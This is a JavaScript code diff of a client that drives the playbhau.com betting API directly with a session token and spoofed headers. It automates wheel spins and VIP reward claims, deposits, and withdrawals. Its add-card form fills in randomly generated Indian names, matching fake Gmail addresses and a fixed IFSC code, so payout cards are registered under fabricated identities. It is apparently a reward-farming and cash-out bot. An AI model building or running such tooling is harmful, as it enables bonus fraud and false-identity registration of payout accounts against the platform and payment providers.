-        ua: 'Mozilla/5.0',
-        versionCode: '999'
-      };
-      const headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh2255.xyz/app/card/add', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0 || data.success === true) {
-          let newCardId = null;
-          if (data.data && data.data.id) {
-            newCardId = parseInt(data.data.id);
-          } else if (data.data && data.data.cardId) {
-            newCardId = parseInt(data.data.cardId);
-          }
-          
-          return { 
-            success: true, 
-            data: data,
-            newCardId: newCardId
-          };
-        }
-        return { success: false, msg: data.msg || 'Add card failed' };
-      }
-      return { success: false, msg: 'Network error' };
-    } catch (e) { return { success: false, msg: e.message }; }
-  }
-
-  async function apiDeleteCard(cardId) {
-    if (!state.token) return { success: false, msg: 'Not logged in' };
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        id: parseInt(cardId),
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0',
-        versionCode: '999'
-      };
-      const headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh2255.xyz/app/card/del', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0 || data.success === true) return { success: true };
-        return { success: false, msg: data.msg || 'Delete failed' };
-      }
-      return { success: false, msg: 'Network error' };
-    } catch (e) { return { success: false, msg: e.message }; }
-  }
-
-  async function apiWithdraw(amount, cardId) {
-    if (!state.token) return { success: false, msg: 'Not logged in' };
-    try {
-      const req_date = Date.now();
-      const payload = {
-        channel: 'h5',
-        channelId: 'Samsung',
-        lang: 'en_US',
-        visitor: state.visitor,
-        cardId: parseInt(cardId),
-        price: parseFloat(amount),
-        packageId: 2,
-        packageInfo: 'com.resulta.checka',
-        reqDate: req_date,
-        ua: 'Mozilla/5.0',
-        versionCode: '999'
-      };
-      const headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'token': state.token,
-        'packageid': '2',
-        'Origin': 'https://playbhau.com',
-        'Referer': 'https://playbhau.com/'
-      };
-      const res = await fetch('https://api.bh2255.xyz/app/pay/paid', {
-        method: 'POST',
-        headers,
-        body: JSON.stringify(payload)
-      });
-      if (res.status === 200) {
-        const data = await res.json();
-        if (data.code === 0 || data.success === true) return { success: true, data };
-        return { success: false, msg: data.msg || 'Withdraw failed' };
-      }
-      return { success: false, msg: 'Network error' };
-    } catch (e) { return { success: false, msg: e.message }; }
-  }
-
-  // ---- AUTO CLAIM ----
-  async function autoClaim() {
-    if (state.isAutoClaiming) return;
-    if (!state.isLoggedIn) return;
-    if (!confirm('⚡ Start Auto Claim?\n\n1st Spin → VIP Reward → wait 3s → 2nd Spin')) return;
-    
-    state.isAutoClaiming = true;
-    showPanel(`
-      <div class="dynamic-card">
-        <div class="title">⚡ Auto Claim Progress <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div id="autoClaimProgress" style="font-size:12px;color:#8a9aaa;"></div>
-      </div>
-    `);
-    const progressDiv = document.getElementById('autoClaimProgress');
-    let results = [];
-    try {
-      progressDiv.innerHTML += `<div>🎰 Spin #1 ...</div>`;
-      const s1 = await spinTurntable(10,1);
-      if (s1) { results.push({ step: 'Spin #1', status: '✅ Success' });
-        progressDiv.innerHTML += `<div style="color:#5df0ae;">✅ Spin #1 successful!</div>`;
-      } else { results.push({ step: 'Spin #1', status: '❌ Failed' });
-        progressDiv.innerHTML += `<div style="color:#ff6b6b;">❌ Spin #1 failed</div>`;
-      }
-      await new Promise(r => setTimeout(r, 500));
-      progressDiv.innerHTML += `<div>👑 Claiming VIP Reward...</div>`;
-      const vip = await claimVipReward();
-      if (vip) { results.push({ step: 'VIP Reward', status: '✅ Success' });
-        progressDiv.innerHTML += `<div style="color:#5df0ae;">✅ VIP Reward claimed!</div>`;
-      } else { results.push({ step: 'VIP Reward', status: '❌ Failed' });
-        progressDiv.innerHTML += `<div style="color:#ff6b6b;">❌ VIP failed</div>`;
-      }
-      progressDiv.innerHTML += `<div style="color:#ffd45d;">⏳ Waiting 3 seconds...</div>`;
-      await new Promise(r => setTimeout(r, 3000));
-      progressDiv.innerHTML += `<div>🎰 Spin #2 ...</div>`;
-      const s2 = await spinTurntable(10,1);
-      if (s2) { results.push({ step: 'Spin #2', status: '✅ Success' });
-        progressDiv.innerHTML += `<div style="color:#5df0ae;">✅ Spin #2 successful!</div>`;
-      } else { results.push({ step: 'Spin #2', status: '❌ Failed' });
-        progressDiv.innerHTML += `<div style="color:#ff6b6b;">❌ Spin #2 failed</div>`;
-      }
-      await getBalance();
-      progressDiv.innerHTML += `<div style="margin-top:10px;border-top:1px solid rgba(255,255,255,0.06);padding-top:8px;color:#ffd700;font-weight:700;">📊 Summary</div>`;
-      results.forEach(r => {
-        const color = r.status.includes('✅') ? '#5df0ae' : '#ff6b6b';
-        progressDiv.innerHTML += `<div style="color:${color};">${r.step}: ${r.status}</div>`;
-      });
-      progressDiv.innerHTML += `<div style="color:#68a9ff;">💰 Balance: ₹${state.balance.toFixed(2)}</div>`;
-      const successCount = results.filter(r => r.status.includes('✅')).length;
-      if (successCount === 3) {
-        progressDiv.innerHTML += `<div style="color:#ffd700;font-weight:700;font-size:14px;margin-top:8px;">🎉 ALL STEPS COMPLETED!</div>`;
-      } else {
-        progressDiv.innerHTML += `<div style="color:#ffd45d;margin-top:8px;">⚠️ Some steps failed. Check logs.</div>`;
-      }
-    } catch (e) {
-      progressDiv.innerHTML += `<div style="color:#ff6b6b;">❌ Error: ${e.message}</div>`;
-    }
-    state.isAutoClaiming = false;
-  }
-
-  // ---- PANEL MANAGEMENT ----
-  function showPanel(html) {
-    dynamicContent.innerHTML = html;
-    dynamicContent.style.display = 'block';
-    document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active-option'));
-    state.isPanelOpen = true;
-    hideAutoNumberPanel();
-  }
-
-  function closePanel() {
-    dynamicContent.innerHTML = '';
-    dynamicContent.style.display = 'none';
-    document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active-option'));
-    state.currentPanel = null;
-    state.isPanelOpen = false;
-    showAutoNumberPanel();
-    updateNumberDisplayFromServer();
-  }
-  window._closePanel = closePanel;
-
-  // ---- DEPOSIT RENDER ----
-  async function renderDeposit() {
-    state.currentPanel = 'deposit';
-    await getDepositAmounts();
-    await getPaymentMethods();
-    
-    const upiPayments = state.paymentMethods.filter(m => 
-      m.payTag === 'PAYMENT_CENTER_PAY' && 
-      (m.payName && m.payName.toUpperCase().includes('UPI'))
-    );
-    
-    let defaultPayment = null;
-    if (upiPayments.length > 0) {
-      const preferred = ['UPI01', 'UPI02', 'UPI06'];
-      for (const pref of preferred) {
-        const found = upiPayments.find(m => m.payName && m.payName.toUpperCase().includes(pref));
-        if (found) {
-          defaultPayment = found;
-          break;
-        }
-      }
-      if (!defaultPayment) {
-        defaultPayment = upiPayments[0];
-      }
-    }
-    
-    if (!defaultPayment && state.paymentMethods.length > 0) {
-      defaultPayment = state.paymentMethods[0];
-    }
-    
-    if (defaultPayment) {
-      state.selectedPayment = { id: defaultPayment.id, tag: defaultPayment.payTag };
-    }
-    
-    state.selectedAmount = 200;
-    
-    let html = `
-      <div class="dynamic-card">
-        <div class="title">💰 Deposit <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div id="depositContent">
-    `;
-    
-    html += `<div style="margin-bottom:8px;"><div style="color:#7a8aaa;font-size:10px;font-weight:600;margin-bottom:4px;">Amount</div>
+    let html=`<div class="dynamic-card"><div class="title">💰 Deposit <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div id="depositContent"><div style="margin-bottom:8px;"><div style="color:#6b7280;font-size:10px;font-weight:600;margin-bottom:4px;">Amount</div>
       <div class="amount-grid" id="amountGrid">`;
-    
-    if (state.depositAmounts.length > 0) {
-      for (const item of state.depositAmounts) {
-        const amt = parseFloat(item.balance);
-        const active = amt === 200 ? 'active' : '';
-        html += `<button class="amount-btn ${active}" data-amount="${amt}" data-balanceid="${item.id}">₹${amt}</button>`;
+    if(S.depositAmounts.length){
+      for(const item of S.depositAmounts){
+        const amt=parseFloat(item.balance);
+        html+=`<button class="amount-btn ${amt===200?'active':''}" data-amount="${amt}" data-balanceid="${item.id}">₹${amt}</button>`;
       }
     }
-    html += `<button class="amount-btn custom-amount-btn" id="customAmountBtn">✏️ Custom</button>`;
-    html += `</div></div>`;
-    
-    html += `<div id="customAmountInput" style="display:none;margin-bottom:8px;">
-      <input type="number" id="customAmountField" placeholder="Enter custom amount" min="1" style="width:100%;padding:10px 14px;background:rgba(5,9,24,0.5);border:1px solid rgba(255,255,255,0.04);border-radius:14px;color:#eef2f9;font-size:14px;outline:none;box-shadow:inset 0 2px 8px rgba(0,0,0,0.1);">
-    </div>`;
-    
-    html += `<div style="margin-bottom:8px;"><div style="color:#7a8aaa;font-size:10px;font-weight:600;margin-bottom:4px;">Payment</div>
+    html+=`<button class="amount-btn custom-amount-btn" id="customAmountBtn">✏️ Custom</button></div></div>
+      <div id="customAmountInput" style="display:none;margin-bottom:8px;">
+        <input type="number" id="customAmountField" placeholder="Enter custom amount" min="1" style="width:100%;padding:10px 14px;background:rgba(8,12,26,0.6);border:1px solid rgba(255,255,255,0.02);border-radius:16px;color:#e2e8f0;font-size:14px;outline:none;box-shadow:inset 0 2px 8px rgba(0,0,0,0.1);">
+      </div>
+      <div style="margin-bottom:8px;"><div style="color:#6b7280;font-size:10px;font-weight:600;margin-bottom:4px;">Payment</div>
       <div id="paymentMethodsList">`;
-    
-    const payMethods = state.paymentMethods.filter(m => m.payTag === 'PAYMENT_CENTER_PAY');
-    if (!payMethods.length) {
-      html += '<div style="color:#6a7a9a;">No payment methods</div>';
-    } else {
-      for (const m of payMethods) {
-        const selected = (state.selectedPayment && state.selectedPayment.id === m.id) ? 'selected' : '';
-        html += `<div class="payment-method ${selected}" data-id="${m.id}" data-tag="${m.payTag}">
-          <div><div class="pm-name">${m.payName || 'Unknown'}</div><div class="pm-desc">₹${m.minAmount || 0} - ₹${m.maxAmount || 0}</div></div>
+    const payMethods=S.paymentMethods.filter(m=>m.payTag==='PAYMENT_CENTER_PAY');
+    if(!payMethods.length) html+='<div style="color:#6b7280;">No payment methods</div>';
+    else{
+      for(const m of payMethods){
+        const sel=(S.selectedPayment && S.selectedPayment.id===m.id)?'selected':'';
+        html+=`<div class="payment-method ${sel}" data-id="${m.id}" data-tag="${m.payTag}">
+          <div><div class="pm-name">${m.payName||'Unknown'}</div><div class="pm-desc">₹${m.minAmount||0} - ₹${m.maxAmount||0}</div></div>
         </div>`;
       }
     }
-    html += `</div></div>`;
-    
-    html += `
+    html+=`</div></div>
       <button class="btn-sm btn-deposit btn-block" id="depositSubmitBtn">💳 Deposit Now</button>
-      <div id="depositResult" class="mt-10"></div>
-    </div></div>`;
-    
+      <div id="depositResult" class="mt-10"></div></div></div>`;
     showPanel(html);
-    
-    document.querySelectorAll('.amount-btn:not(.custom-amount-btn)').forEach(b => {
-      b.addEventListener('click', function() {
-        document.querySelectorAll('.amount-btn').forEach(x => x.classList.remove('active'));
+
+    document.querySelectorAll('.amount-btn:not(.custom-amount-btn)').forEach(b=>{
+      b.addEventListener('click',function(){
+        document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('active'));
         this.classList.add('active');
-        state.selectedAmount = parseFloat(this.dataset.amount);
-        document.getElementById('customAmountInput').style.display = 'none';
-        document.getElementById('customAmountField').value = '';
+        S.selectedAmount=parseFloat(this.dataset.amount);
+        document.getElementById('customAmountInput').style.display='none';
+        document.getElementById('customAmountField').value='';
         document.getElementById('customAmountBtn').classList.remove('active');
       });
     });
-    
-    document.getElementById('customAmountBtn').addEventListener('click', function() {
-      document.querySelectorAll('.amount-btn').forEach(x => x.classList.remove('active'));
+    document.getElementById('customAmountBtn').addEventListener('click',function(){
+      document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('active'));
       this.classList.add('active');
-      const input = document.getElementById('customAmountInput');
-      input.style.display = 'block';
+      document.getElementById('customAmountInput').style.display='block';
       document.getElementById('customAmountField').focus();
-      state.selectedAmount = null;
+      S.selectedAmount=null;
     });
-    
-    document.getElementById('customAmountField').addEventListener('input', function() {
-      const val = parseFloat(this.value);
-      if (!isNaN(val) && val > 0) {
-        state.selectedAmount = val;
-      } else {
-        state.selectedAmount = null;
-      }
+    document.getElementById('customAmountField').addEventListener('input',function(){
+      const v=parseFloat(this.value);
+      S.selectedAmount=(!isNaN(v) && v>0)?v:null;
     });
-    
-    document.querySelectorAll('.payment-method').forEach(el => {
-      el.addEventListener('click', function() {
-        document.querySelectorAll('.payment-method').forEach(x => x.classList.remove('selected'));
+    document.querySelectorAll('.payment-method').forEach(el=>{
+      el.addEventListener('click',function(){
+        document.querySelectorAll('.payment-method').forEach(x=>x.classList.remove('selected'));
         this.classList.add('selected');
-        state.selectedPayment = { id: parseInt(this.dataset.id), tag: this.dataset.tag };
+        S.selectedPayment={id:parseInt(this.dataset.id),tag:this.dataset.tag};
       });
     });
-    
-    document.getElementById('depositSubmitBtn').addEventListener('click', async function() {
-      if (!state.selectedAmount) {
-        showToast('Please select or enter an amount.', 'warning');
-        return;
+    document.getElementById('depositSubmitBtn').addEventListener('click',async function(){
+      if(!S.selectedAmount){ showToast('Please select or enter an amount.','warning'); return; }
+      if(!S.selectedPayment){ showToast('Please select a payment method.','warning'); return; }
+      let balanceId=null;
+      for(const item of S.depositAmounts){
+        if(parseFloat(item.balance)===parseFloat(S.selectedAmount)){ balanceId=String(item.id); break; }
       }
-      if (!state.selectedPayment) {
-        showToast('Please select a payment method.', 'warning');
-        return;
-      }
-      
-      let balanceId = null;
-      for (const item of state.depositAmounts) {
-        if (parseFloat(item.balance) === parseFloat(state.selectedAmount)) {
-          balanceId = String(item.id);
-          break;
-        }
-      }
-      
-      if (!balanceId && state.depositAmounts.length > 0) {
-        for (const item of state.depositAmounts) {
-          if (parseFloat(item.balance) === parseFloat(state.selectedAmount)) {
-            balanceId = String(item.id);
-            break;
-          }
-        }
-        if (!balanceId) {
-          balanceId = String(state.depositAmounts[0].id);
-        }
-      }
-      
-      if (!balanceId) {
-        showToast('No valid balance ID found for this amount.', 'error');
-        return;
-      }
-      
-      this.disabled = true;
-      this.textContent = '⏳ Processing...';
-      
-      const result = await createDeposit(
-        state.selectedAmount,
-        state.selectedPayment.id,
-        balanceId,
-        state.selectedPayment.tag
-      );
-      
-      this.disabled = false;
-      this.textContent = '💳 Deposit Now';
-      
-      const div = document.getElementById('depositResult');
-      if (result && result.code === 0) {
-        let url = result.data ? result.data.replace(/\\/g, '') : '';
-        if (url) {
-          window.open(url, '_blank');
-          showToast('Deposit page opened!', 'success');
-        }
-        div.innerHTML = `
-          <div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:14px;">
-            <div style="color:#5df0ae;font-weight:600;">✅ Deposit created!</div>
-            ${url ? `<div style="font-size:9px;word-break:break-all;margin-top:4px;color:#8a9aaa;">🔗 ${url}</div>` : ''}
+      if(!balanceId && S.depositAmounts.length) balanceId=String(S.depositAmounts[0].id);
+      if(!balanceId){ showToast('No valid balance ID.','error'); return; }
+      this.disabled=true; this.textContent='⏳ Processing...';
+      try{
+        const r=await fetch('https://api.bh2255.xyz/app/pay/income',{
+          method:'POST',
+          headers:{'Accept':'application/json, text/plain, */*','Content-Type':'application/json','token':S.token,'packageid':'2','visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+          body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,reqDate:Date.now(),ua:'Mozilla/5.0',packageId:2,packageInfo:'com.resulta.checka',versionCode:'999',balanceId:String(balanceId),payTag:S.selectedPayment.tag||'PAYMENT_CENTER_PAY',payTypeId:String(S.selectedPayment.id),rechargeBalance:0,payCategory:1})
+        });
+        const d=await r.json();
+        const div=document.getElementById('depositResult');
+        if(r.status===200 && d.code===0){
+          let url=d.data?d.data.replace(/\\/g,''):'';
+          if(url){ window.open(url,'_blank'); showToast('Deposit page opened!','success'); }
+          div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;">
+            <div style="color:#34d399;font-weight:600;">✅ Deposit created!</div>
+            ${url?`<div style="font-size:9px;word-break:break-all;margin-top:4px;color:#6b7280;">🔗 ${url}</div>`:''}
             <div style="margin-top:6px;display:flex;gap:6px;">
               <button class="btn-sm btn-warning" onclick="window.open('${url}','_blank')" style="padding:6px 14px;font-size:11px;">🌐 Open</button>
               <button class="btn-sm btn-outline" onclick="navigator.clipboard.writeText('${url}')" style="padding:6px 14px;font-size:11px;">📋 Copy</button>
             </div>
-          </div>
-        `;
-      } else {
-        div.innerHTML = `<div style="color:#ff6b6b;">❌ ${result?.msg || 'Failed'}</div>`;
-        showToast('Deposit failed: ' + (result?.msg || 'Unknown error'), 'error');
-      }
+          </div>`;
+        }else{
+          div.innerHTML=`<div style="color:#fb7185;">❌ ${d.msg||'Failed'}</div>`;
+          showToast('Deposit failed: '+(d.msg||'Unknown'),'error');
+        }
+      }catch(e){ showToast('Error: '+e.message,'error'); }
+      this.disabled=false; this.textContent='💳 Deposit Now';
     });
   }
 
-  // ---- ADD BANK CARD RENDER ----
-  async function renderAddCard() {
-    state.currentPanel = 'addcard';
-    await getWithdrawCards();
-    const firstNames = ['Ananya','Aadhya','Ishita','Aanya','Advika','Charvi','Diya','Anvi','Aarohi','Sara','Riya','Naira','Pari','Tara','Ira','Vanya','Myra','Kavya','Priya','Neha','Sneha','Anika','Aisha','Meera','Kaira','Ishani','Anjali','Sakshi','Trisha','Ridhi','Sanvi','Shreya','Pihu','Adviti','Tanvi','Suhani','Kiara','Arya','Anaya'];
-    const lastNames = ['Sharma','Verma','Patel','Kumar','Singh','Gupta','Yadav','Joshi','Malhotra','Mehta','Agarwal','Bhatia','Chopra','Kaur','Das','Sen','Mukherjee','Banerjee','Chatterjee','Basu','Dutta','Ganguly','Lahiri','Majumdar','Maitra','Pal','Sarkar','Bose','Chakraborty','Roy'];
-    const randName = () => firstNames[Math.floor(Math.random()*firstNames.length)] + ' ' + lastNames[Math.floor(Math.random()*lastNames.length)];
-    const randEmail = (n) => n.toLowerCase().replace(/ /g,'') + '@gmail.com';
-    let cardHtml = '';
-    if (state.cardList && state.cardList.length) {
-      cardHtml = '<div style="margin-bottom:10px;color:#68a9ff;font-size:12px;font-weight:600;">📋 Your Cards:</div>';
-      for (const c of state.cardList) {
-        const id = c.id || c.cardId || '?';
-        const holder = c.accountName || c.holderName || c.name || 'Unknown';
-        const bank = c.bankName || c.bank || 'Bank';
-        const acc = c.accountNumber || c.cardNumber || c.cardNo || '';
-        const isSelected = state.selectedCard !== null && parseInt(id) === state.selectedCard;
-        cardHtml += `<div style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.2);padding:6px 12px;border-radius:12px;margin-bottom:4px;border:1px solid ${isSelected ? 'rgba(125,255,179,0.3)' : 'rgba(255,255,255,0.02)'};">
-          <div style="font-size:12px;"><span style="color:#ffd700;">${bank}</span> - ${holder}<div style="color:#6a7a9a;font-size:10px;">${acc ? '****'+acc.slice(-4) : ''}</div></div>
-          <button class="btn-sm btn-danger delete-card-btn" data-id="${id}" style="padding:2px 10px;font-size:10px;border:1px solid rgba(255,70,70,0.1);background:rgba(255,70,70,0.06);color:#ff6b6b;border-radius:10px;">🗑️</button>
+  // ─── WITHDRAW ─────────────────────────────────────────────────────────────
+  async function renderWithdraw(){
+    S.currentPanel='withdraw';
+    await getBalance();
+    try{
+      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
+        method:'POST',
+        headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
+      });
+      if(r.status===200){ const d=await r.json(); if(d.code===0){ S.withdrawCards=d.data||[]; S.cardList=S.withdrawCards; if(S.withdrawCards.length && S.selectedCard===null){ const id=parseInt(S.withdrawCards[0].id||S.withdrawCards[0].cardId); if(!isNaN(id)) S.selectedCard=id; } } }
+    }catch(_){}
+    let cardHtml='';
+    if(S.withdrawCards && S.withdrawCards.length){
+      cardHtml=`<div style="margin-bottom:8px;"><div style="color:#6b7280;font-size:10px;font-weight:600;margin-bottom:4px;">Select Card</div><div id="cardList">`;
+      for(const c of S.withdrawCards){
+        const id=parseInt(c.id||c.cardId||'?');
+        const holder=c.accountName||c.holderName||c.name||'Unknown';
+        const bank=c.bankName||c.bank||'Bank';
+        const acc=c.accountNumber||c.cardNumber||c.cardNo||'';
+        const sel=(S.selectedCard!==null && id===S.selectedCard)?'selected':'';
+        cardHtml+=`<div class="payment-method card-item ${sel}" data-id="${id}"><div><div class="pm-name">${bank} - ${holder}</div><div class="pm-desc">${acc?'****'+acc.slice(-4):''}</div></div></div>`;
+      }
+      cardHtml+=`</div></div>`;
+    }else cardHtml='<div style="color:#fb7185;font-size:12px;text-align:center;padding:8px;">❌ No bank card found. Please add a card first.</div>';
+
+    showPanel(`<div class="dynamic-card"><div class="title">💸 Withdraw Funds <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div class="balance-info">Available Balance: <span>₹${S.balance.toFixed(2)}</span></div>
+      ${cardHtml}
+      <div style="margin-top:8px;"><div style="color:#6b7280;font-size:10px;font-weight:600;margin-bottom:4px;">Enter Amount</div>
+        <input type="number" id="withdrawAmountInput" placeholder="Enter amount to withdraw" min="0" step="1" style="width:100%;padding:10px 14px;background:rgba(8,12,26,0.6);border:1px solid rgba(255,255,255,0.02);border-radius:16px;color:#e2e8f0;font-size:14px;outline:none;box-shadow:inset 0 2px 8px rgba(0,0,0,0.1);">
+      </div>
+      <button class="btn-sm btn-withdraw btn-block" id="withdrawSubmitBtn" ${!S.withdrawCards||!S.withdrawCards.length?'disabled':''}>💸 Withdraw Now</button>
+      <div id="withdrawResult" class="mt-10"></div></div>`);
+
+    document.querySelectorAll('.card-item').forEach(el=>{
+      el.addEventListener('click',function(){
+        document.querySelectorAll('.card-item').forEach(x=>x.classList.remove('selected'));
+        this.classList.add('selected');
+        S.selectedCard=parseInt(this.dataset.id);
+      });
+    });
+    document.getElementById('withdrawSubmitBtn').addEventListener('click',async function(){
+      if(!S.selectedCard){ showToast('Please select a card.','warning'); return; }
+      const amt=parseFloat(document.getElementById('withdrawAmountInput').value);
+      if(!amt || amt<=0){ showToast('Enter valid amount.','warning'); return; }
+      if(amt>S.balance){ showToast(`Amount exceeds balance (₹${S.balance.toFixed(2)})`,'warning'); return; }
+      this.disabled=true; this.textContent='⏳ Processing...';
+      try{
+        const r=await fetch('https://api.bh2255.xyz/app/pay/paid',{
+          method:'POST',
+          headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+          body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,cardId:S.selectedCard,price:amt,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
+        });
+        const d=await r.json();
+        const div=document.getElementById('withdrawResult');
+        if(r.status===200 && (d.code===0||d.success===true)){
+          div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
+          showToast('Withdrawal successful!','success');
+          await getBalance(); balanceDisplay.textContent=S.balance.toFixed(2);
+          document.getElementById('withdrawAmountInput').value='';
+        }else{
+          div.innerHTML=`<div style="color:#fb7185;">❌ ${d.msg||'Failed'}</div>`;
+          showToast('Withdrawal failed: '+(d.msg||'Unknown'),'error');
+        }
+      }catch(e){ showToast('Error: '+e.message,'error'); }
+      this.disabled=false; this.textContent='💸 Withdraw Now';
+    });
+  }
+
+  // ─── ADD CARD (with Google Lens / Camera) ────────────────────────────────
+  async function renderAddCard(){
+    S.currentPanel='addcard';
+    try{
+      const r=await fetch('https://api.bh556677ww.com/app/card/info',{
+        method:'POST',
+        headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+        body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
+      });
+      if(r.status===200){ const d=await r.json(); if(d.code===0){ S.withdrawCards=d.data||[]; S.cardList=S.withdrawCards; } }
+    }catch(_){}
+    const firsts=['Ananya','Aadhya','Ishita','Aanya','Advika','Charvi','Diya','Anvi','Aarohi','Sara','Riya','Naira','Pari','Tara','Ira','Vanya','Myra','Kavya','Priya','Neha','Sneha','Anika','Aisha','Meera','Kaira','Ishani','Anjali','Sakshi','Trisha','Ridhi','Sanvi','Shreya','Pihu','Adviti','Tanvi','Suhani','Kiara','Arya','Anaya'];
+    const lasts=['Sharma','Verma','Patel','Kumar','Singh','Gupta','Yadav','Joshi','Malhotra','Mehta','Agarwal','Bhatia','Chopra','Kaur','Das','Sen','Mukherjee','Banerjee','Chatterjee','Basu','Dutta','Ganguly','Lahiri','Majumdar','Maitra','Pal','Sarkar','Bose','Chakraborty','Roy'];
+    const randName=()=>firsts[Math.floor(Math.random()*firsts.length)]+' '+lasts[Math.floor(Math.random()*lasts.length)];
+    const randEmail=n=>n.toLowerCase().replace(/ /g,'')+'@gmail.com';
+    let cardHtml='';
+    if(S.cardList && S.cardList.length){
+      cardHtml='<div style="margin-bottom:10px;color:#a5b4fc;font-size:12px;font-weight:600;">📋 Your Cards:</div>';
+      for(const c of S.cardList){
+        const id=parseInt(c.id||c.cardId||'?');
+        const holder=c.accountName||c.holderName||c.name||'Unknown';
+        const bank=c.bankName||c.bank||'Bank';
+        const acc=c.accountNumber||c.cardNumber||c.cardNo||'';
+        cardHtml+=`<div style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.2);padding:6px 12px;border-radius:14px;margin-bottom:4px;border:1px solid ${(S.selectedCard!==null && id===S.selectedCard)?'rgba(52,211,153,0.15)':'rgba(255,255,255,0.01)'};">
+          <div style="font-size:12px;"><span style="color:#fbbf24;">${bank}</span> - ${holder}<div style="color:#6b7280;font-size:10px;">${acc?'****'+acc.slice(-4):''}</div></div>
+          <button class="btn-sm delete-card-btn" data-id="${id}" style="padding:2px 10px;font-size:10px;border:1px solid rgba(251,113,133,0.06);background:rgba(251,113,133,0.03);color:#fb7185;border-radius:10px;">🗑️</button>
         </div>`;
       }
-    } else cardHtml = '<div style="color:#6a7a9a;font-size:12px;margin-bottom:10px;">No cards added</div>';
-
-    const autoName = randName();
-    showPanel(`
-      <div class="dynamic-card">
-        <div class="title">💳 Add Bank Card <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        ${cardHtml}
-        <div style="border-top:1px solid rgba(255,255,255,0.04);padding-top:12px;">
-          <div class="input-group"><label>👤 Account Holder</label><input id="cardNameInput" value="${autoName}"></div>
-          <div class="input-group"><label>💳 Account Number</label><input id="cardNumberInput" placeholder="1234567890"></div>
-          <div class="input-group"><label>🏛️ IFSC</label><input id="ifscInput" value="MAHB0002009"></div>
-          <div class="input-group"><label>📧 Email</label><input id="cardEmailInput" value="${randEmail(autoName)}"></div>
-          <button class="btn-sm btn-card-add btn-block" id="addCardSubmitBtn">➕ Add Card</button>
-          <div id="addCardResult" class="mt-10"></div>
-        </div>
-      </div>
-    `);
-
-    document.querySelectorAll('.delete-card-btn').forEach(b => {
-      b.addEventListener('click', async function() {
-        if (!confirm('Delete card?')) return;
-        const res = await apiDeleteCard(this.dataset.id);
-        if (res.success) { 
-          if (state.selectedCard !== null && parseInt(this.dataset.id) === state.selectedCard) {
-            state.selectedCard = null;
-          }
-          renderAddCard(); 
-          await getWithdrawCards(); 
-        }
-      });
-    });
-
-    document.getElementById('addCardSubmitBtn').addEventListener('click', async function() {
-      const name = document.getElementById('cardNameInput').value.trim();
-      const number = document.getElementById('cardNumberInput').value.trim().replace(/\s/g,'');
-      const ifsc = document.getElementById('ifscInput').value.trim().toUpperCase();
-      const email = document.getElementById('cardEmailInput').value.trim();
-      if (!name || !number || !ifsc) return;
-      this.disabled = true; this.textContent = '⏳ Adding...';
-      const result = await apiAddCard(name, number, ifsc, email);
-      this.disabled = false; this.textContent = '➕ Add Card';
-      const div = document.getElementById('addCardResult');
-      if (result.success) {
-        div.innerHTML = `<div style="color:#5df0ae;">✅ Card added!</div>`;
-        
-        if (result.newCardId) {
-          state.selectedCard = result.newCardId;
-          console.log(`Auto-selected new card ID: ${result.newCardId}`);
-        } else {
-          await getWithdrawCards();
-          if (state.withdrawCards.length > 0) {
-            const firstId = parseInt(state.withdrawCards[0].id || state.withdrawCards[0].cardId);
-            if (!isNaN(firstId)) {
-              state.selectedCard = firstId;
-            }
-          }
-        }
-        
-        const newName = randName();
